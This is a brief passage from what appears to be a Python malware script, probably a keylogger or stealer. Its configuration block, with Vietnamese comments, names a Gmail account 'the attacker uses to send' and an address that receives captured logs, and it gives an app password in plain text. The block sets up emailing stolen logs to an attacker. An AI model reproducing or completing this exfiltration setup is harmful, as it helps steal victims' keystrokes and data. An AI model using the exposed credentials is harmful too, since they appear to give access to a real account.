...
# ===== CẤU HÌNH =====
EMAIL_SEND = "bobap0701@gmail.com"      # Email attacker dùng để gửi
EMAIL_PASSWORD = "jylw utbr xlex ewvu"     # Mật khẩu ứng dụng Gmail
EMAIL_RECEIVE = "bobap0701@gmail.com" # Email nhận log
